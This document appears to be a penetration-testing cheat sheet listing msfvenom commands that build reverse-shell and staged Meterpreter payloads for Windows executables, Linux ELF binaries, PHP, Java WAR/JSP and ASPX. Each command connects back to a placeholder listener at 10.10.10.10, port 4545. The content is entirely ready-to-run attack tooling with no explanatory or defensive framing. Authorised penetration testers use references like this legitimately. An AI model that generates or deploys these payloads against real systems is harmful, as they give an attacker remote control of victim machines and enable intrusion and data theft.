# MSFvenom Payload Reference

### Windows (.exe)
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f exe > win_rshell_10.10.10.10_4545.exe
```
### Linux (.elf)
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f elf > lin_rshell_10.10.10.10_4545.elf
```
### PHP
```
msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=4545 -f raw > php_rshell_10.10.10.10_4545.php
```
### Java (.war / JSP)
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f raw > war_rshell_10.10.10.10_4545.war
```
### ASPX
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f aspx > aspx_rshell_10.10.10.10_4545.aspx
```
## Meterpreter Staged Payloads

### Windows (.exe)
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f exe > win_met_10.10.10.10_4545.exe
```
### Linux (.elf)
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f elf > lin_met_10.10.10.10_4545.elf
```
### PHP
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f raw > php_met_10.10.10.10_4545.php
```
### Java (.war)
```
msfvenom -p java/meterpreter/reverse_http LHOST=10.10.10.10 LPORT=4545 -f raw > war_met_10.10.10.10_4545.war
```
### ASPX
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f aspx > aspx_met_10.10.10.10_4545.aspx
```
